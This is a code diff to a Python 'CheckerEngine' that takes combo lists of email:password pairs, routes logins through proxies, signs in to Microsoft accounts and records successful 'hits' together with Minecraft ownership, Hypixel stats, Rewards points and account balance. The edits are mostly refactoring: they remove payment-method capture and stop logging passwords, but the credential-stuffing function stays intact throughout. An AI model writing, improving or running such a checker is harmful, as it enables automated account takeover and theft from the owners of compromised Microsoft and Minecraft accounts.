@@ -5,21 +5,23 @@ import random
 import os
 import zipfile
 import asyncio
-from datetime import datetime
 from proxy_parser import parse_proxy
 from login_helper import microsoft_login
 import minecraft_checker
 import hypixel_stats
 import balance as balance_checker
 import donut_stats as donut_checker
-import payment_methods as payment_checker
 import rewardpoints as reward_checker
 
 class CheckerEngine:
     def __init__(self, user_id, combo_list, proxy_list, threads, settings, db, bot, loop):
         self.user_id = user_id
         self.combo_list = combo_list
-        self.proxy_list = [parse_proxy(p) for p in proxy_list if parse_proxy(p)]
+        self.proxy_list = []
+        for proxy in proxy_list:
+            parsed_proxy = parse_proxy(proxy)
+            if parsed_proxy:
+                self.proxy_list.append(parsed_proxy)
         self.threads = threads
         self.settings = settings
         self.db = db
@@ -38,12 +40,15 @@ class CheckerEngine:
         os.makedirs(self.results_dir, exist_ok=True)
         self.lock = threading.Lock()
 
-        # Files for results
         self.files = {
-            'hits': open(f"{self.results_dir}/hits.txt", "a"),
-            'bad': open(f"{self.results_dir}/bad.txt", "a"),
-            'errors': open(f"{self.results_dir}/errors.txt", "a")
+            'hits': open(f"{self.results_dir}/hits.txt", "a", encoding="utf-8"),
+            'bad': open(f"{self.results_dir}/bad.txt", "a", encoding="utf-8"),
+            'errors': open(f"{self.results_dir}/errors.txt", "a", encoding="utf-8")
         }
+
+    @staticmethod
+    def safe_account_label(email):
+        return email.strip() if email else "unknown"
 
     def get_proxy(self):
         if not self.proxy_list:
@@ -85,7 +90,7 @@ class CheckerEngine:
             )
             try:
                 await msg_obj.edit_text(text, parse_mode="HTML")
-            except:
+            except Exception:
                 pass
             await asyncio.sleep(5)
 
@@ -96,11 +101,14 @@ class CheckerEngine:
 
     def check_account(self, combo):
         if ":" not in combo:
-            with self.lock: self.errors += 1
-            self.checked += 1
+            with self.lock:
+                self.errors += 1
+                self.checked += 1
+            self.db.update_stats(self.user_id, errors=1)
             return
 
         email, password = combo.split(":", 1)
+        account_label = self.safe_account_label(email)
         session = requests.Session()
         session.proxies = self.get_proxy()
 
@@ -108,21 +116,21 @@ class CheckerEngine:
             token, xbox_token = microsoft_login(session, email, password)
 
             if token == "2FA":
-                self.write_result('errors', f"{email}:{password} (2FA)")
-                with self.lock: self.errors += 1
+                self.write_result('errors', f"{account_label} (2FA)")
+                with self.lock:
+                    self.errors += 1
                 self.db.update_stats(self.user_id, errors=1)
                 return
 
             if not token:
-                self.write_result('bad', f"{email}:{password}")
-                with self.lock: self.bad += 1
+                self.write_result('bad', account_label)
+                with self.lock:
+                    self.bad += 1
                 self.db.update_stats(self.user_id, bad=1)
                 return
 
-            # Capture Logic
             capture_data = []
 
-            # Minecraft License
             has_mc = minecraft_checker.checkmc(
                 session, email, password, token, xbox_token,
                 {'timeout': 10}, self.proxy_list, 3, self.get_proxy,
@@ -130,8 +138,9 @@ class CheckerEngine:
                 self.lock, self.results_dir, self.write_result_wrapper,
                 None, lambda *args: None, lambda *args: None
             )
+            if has_mc:
+                capture_data.append("Minecraft: owned")
 
-            # Hypixel Stats
             try:
                 profilerq = session.get(
                     'https://api.minecraftservices.com/minecraft/profile',
@@ -144,37 +153,31 @@ class CheckerEngine:
                     uuid = p_data.get('id', 'N/A')
 
                     hypixel = hypixel_stats.fetch_hypixel_stats(username, uuid)
-                    if hypixel: capture_data.append(f"Hypixel: {hypixel}")
+                    if hypixel:
+                        capture_data.append(f"Hypixel: {hypixel}")
 
-                    # Donut Stats
                     donut_checker.fetch_donut_stats(username, email, password, None, self.results_dir, self.lock, {'donut_stats': True}, self.get_proxy, 'http')
                 else:
                     username = 'N/A'
-            except:
+            except Exception:
                 username = 'N/A'
 
-            # Rewards
             points = reward_checker.fetch_rewards(session, email, password, {'check_rewards_points': True}, self.results_dir, self.write_result_wrapper)
-            if points: capture_data.append(f"Rewards: {points} points")
+            if points:
+                capture_data.append(f"Rewards: {points} points")
 
-            # Balance
             balance = balance_checker.fetch_balance(session, email, password, {'check_microsoft_balance': True}, self.results_dir, self.write_result_wrapper)
-            if balance: capture_data.append(f"Balance: {balance}")
+            if balance:
+                capture_data.append(f"Balance: {balance}")
 
-            # Payment Methods
-            payment_checker.fetch_payment_methods(session, email, password, {'check_payment': True}, self.results_dir, self.lock, self.write_result_wrapper)
-
-            # Final Hit Processing
             full_capture = " | ".join(capture_data)
-            hit_msg = f"{email}:{password} | {full_capture}"
+            hit_msg = f"{account_label} | {full_capture}" if full_capture else account_label
             self.write_result('hits', hit_msg)
-            with self.lock: self.hits += 1
+            with self.lock:
+                self.hits += 1
 
-            # Update DB stats
             self.db.update_stats(self.user_id, hits=1)
 
-            # Send instant notification if enabled (setting index 1 is hit_notifications)
-            # Fetch settings fresh to be sure
             current_settings = self.db.get_settings(self.user_id)
             if current_settings and current_settings[1]:
                 self.loop.call_soon_threadsafe(
@@ -182,11 +185,13 @@ class CheckerEngine:
                 )
 
         except Exception as e:
-            self.write_result('errors', f"{email}:{password} ({str(e)})")
-            with self.lock: self.errors += 1
+            self.write_result('errors', f"{account_label} ({str(e)})")
+            with self.lock:
+                self.errors += 1
             self.db.update_stats(self.user_id, errors=1)
         finally:
-            with self.lock: self.checked += 1
+            with self.lock:
+                self.checked += 1
 
     def run_worker(self):
         while self.is_running:
